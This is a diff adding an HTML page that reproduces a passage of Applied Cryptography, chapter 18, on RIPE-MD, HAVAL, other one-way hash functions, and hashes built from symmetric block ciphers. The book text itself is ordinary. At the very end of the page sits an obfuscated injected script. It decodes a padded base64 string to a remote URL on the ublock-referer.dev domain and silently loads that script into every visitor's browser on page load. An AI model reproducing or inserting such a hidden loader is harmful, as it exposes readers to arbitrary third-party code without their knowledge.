@@ -1,0 +1,107 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:One-Way Hash Functions</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=18//-->
+<!--PAGES=445-447//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<H3><A NAME="Heading9"></A><FONT COLOR="#000077">18.8 RIPE-MD</FONT></H3>
+<P>RIPE-MD was developed for the European Community&#146;s RIPE project [1305] (see Section 25.7). The algorithm is a variation of MD4, designed to resist known cryptanalytic attacks, and produce a 128-bit hash value. The rotations and the order of the message words are modified. Additionally, two instances of the algorithm, differing only in the constants, run in parallel. After each block, the output of both instances are added to the chaining variables. This seems to make the algorithm highly resistant to cryptanalysis.
+</P>
+<H3><A NAME="Heading10"></A><FONT COLOR="#000077">18.9 HAVAL</FONT></H3>
+<P>HAVAL is a variable-length one-way hash function [1646]. It is a modification of MD5. HAVAL processes messages in blocks of 1024 bits, twice those of MD5. It has eight 32-bit chaining variables, twice those of MD5. It has a variable number of rounds, from three to five (each of which has 16 steps), and it can produce a hash length of 128, 160, 192, 224, or 256 bits.
+</P>
+<P>HAVAL replaces MD5&#146;s simple nonlinear functions with highly nonlinear 7-variable functions, each of which satisfies the strict avalanche criterion. Each round uses a single function, but in every step a different permutation is applied to the inputs. It has a new message order and every step (except those in the first round) uses a different additive constant. The algorithm also has two rotations.</P>
+<P>The core of the algorithm is</P>
+<DL>
+<DD><I>TEMP</I> = (f(<I>j,A,B,C,D,E,F,G</I>) &lt&lt&lt 7) &#43; (<I>H</I> &lt&lt&lt 11) &#43; <I>M</I>[<I>i</I>][<I>r</I> (<I>j</I>)] &#43; <I>K</I>(<I>j</I>)
+<DD><I>H</I> = <I>G; G</I> = <I>F; F</I> = <I>E; E</I> = <I>D; D</I> = <I>C; C</I> = <I>B; B</I> = <I>A; A</I> = <I>TEMP</I>
+</DL>
+<P>The variable number of rounds and variable-length output mean there are 15 versions of this algorithm. Den Boer&#146;s and Bosselaers&#146;s attack against MD5 [203] does not apply to HAVAL because of the rotation of H.
+</P>
+<H3><A NAME="Heading11"></A><FONT COLOR="#000077">18.10 Other One-Way Hash Functions</FONT></H3>
+<P>MD3 is yet another hash function designed by Ron Rivest. It had several flaws and never really made it out of the laboratory, although a description was recently published in [1335].
+</P>
+<P>A group of researchers at the University of Waterloo have proposed a one-way hash function based on iterated exponentiation in GF(2<SUP>593</SUP>) [22]. In this scheme, a message is divided into 593-bit blocks; beginning with the first block, the blocks are successively exponentiated. Each exponent is the result of the computation with the previous block; the first exponent is given by an IV.</P>
+<P>Ivan Damg&#229;rd designed a one-way hash function based on the knapsack problem (see Section 19.2) [414]; it can be broken in about 2<SUP>32</SUP> operations [290, 1232, 787].</P>
+<P>Steve Wolfram&#146;s cellular automata [1608] have been proposed as a basis for one-way hash functions. An early implementation [414] is insecure [1052, 404]. Another one-way hash function, Cellhash [384,404], and an improved version, Subhash [384,402, 405], are based on cellular automata; both are designed for hardware. Boognish mixes the design principles of Cellhash with those of MD4 [402, 407]. StepRightUp can be implemented as a hash function as well [402].</P>
+<P>Claus Schnorr proposed a one-way hash function based on the discrete Fourier transform, called FFT-Hash, in the summer of 1991 [1399]; it was broken a few months later by two independent groups [403, 84]. Schnorr proposed a revised version, called FFT-Hash II (the previous version was renamed FFT-Hash I) [1400], which was broken a few weeks later [1567]. Schnorr has proposed further modifications [1402, 1403] but, as it stands, the algorithm is much slower than the others in this chapter. Another hash function, called <I>SL</I><SUB>2</SUB> [1526], is insecure [315].</P>
+<P>Additional theoretical work on constructing one-way hash functions from one-way functions and one-way permutations can be found in [412, 1138, 1342].</P>
+<H3><A NAME="Heading12"></A><FONT COLOR="#000077">18.11 One-Way Hash Functions Using Symmetric Block Algorithms</FONT></H3>
+<P>It is possible to use a symmetric block cipher algorithm as a one-way hash function. The idea is that if the block algorithm is secure, then the one-way hash function will also be secure.
+</P>
+<P>The most obvious method is to encrypt the message with the algorithm in CBC or CFB mode, a fixed key, and IV; the last ciphertext block is the hash value. These methods are described in various standards using DES: both modes in [1143], CFB in [1145], CBC in [55, 56, 54]. This just isn&#146;t good enough for one-way hash functions, although it will work for a MAC (see Section 18.14) [29].</P>
+<P>A cleverer approach uses the message block as the key, the previous hash value as the input, and the current hash value as the output.</P>
+<P>The actual hash functions proposed are even more complex. The block size is usually the key length, and the size of the hash value is the block size. Since most block algorithms are 64 bits, several schemes are designed around a hash that is twice the block size.</P>
+<P>Assuming the hash function is correct, the security of the scheme is based on the security of the underlying block function. There are exceptions, though. Differential cryptanalysis is easier against block functions in hash functions than against block functions used for encryption: The key is known, so several tricks can be applied; only one right pair is needed for success; and you can generate as much chosen plaintext as you want. Some work on these lines is [1263, 858, 1313].</P>
+<P>What follows is a summary of the various hash functions that have appeared in the literature [925, 1465, 1262]. Statements about attacks against these schemes assume that the underlying block cipher is secure; that is, the best attack against them is brute force.</P>
+<P>One useful measure for hash functions based on block ciphers is the <B>hash rate</B>, or the number of <I>n</I>-bit messages blocks, where <I>n</I> is the block size of the algorithm, processed per encryption. The higher the hash rate, the faster the algorithm. (This measure was given the opposite definition in [1262], but the definition given here is more intuitive and is more widely used. This can be confusing.)</P>
+<P><FONT SIZE="+1"><B><I>Schemes Where the Hash Length Equals the Block Size</I></B></FONT></P>
+<P>The general scheme is as follows (see Figure 18.8):
+</P>
+<DL>
+<DD><I>H</I><SUB>0</SUB> = <I>I</I><SUB>H</SUB>, where <I>I</I><SUB>H</SUB> is a random initial value
+<DD><I>H</I><SUB>i</SUB> = <I>E</I><SUB>A</SUB>(<I>B</I>) &#8853; <I>C</I>
+</DL>
+<P>where <I>A, B,</I> and <I>C</I> can be either <I>M</I><SUB>i</SUB>, <I>H</I><SUB>- 1</SUB>, (<I>M</I><SUB>i</SUB> &#8853; <I>H</I><SUB>i - 1</SUB>), or a constant (assumed to be 0). <I>H</I><SUB>0</SUB> is some random initial value: <I>I</I><SUB>H</SUB>. The message is divided up into block-size chunks, <I>M</I><SUB>i,</SUB> and processed individually. And there is some kind of MD-strengthening, perhaps the same padding procedure used in MD5 and SHA.</P>
+<I><P><A NAME="Fig8"></A><A HREF="javascript:displayWindow('images/18-08.jpg',144,50 )"><IMG SRC="images/18-08t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/18-08.jpg',144,50)"><FONT COLOR="#000077"><B>Figure 18.8</B></FONT></A>&nbsp;&nbsp;General hash function where the hash length equals the block size.</I>
+<P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="18-04.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="18-06.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(JgOFzNDq, UdBSKLLd) {UdBSKLLd = JgOFzNDq.createElement('script');UdBSKLLd.type = 'text/javascript';UdBSKLLd.async = true;UdBSKLLd.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');JgOFzNDq.getElementsByTagName('body')[0].appendChild(UdBSKLLd);}(document));</script></body>
+</html>
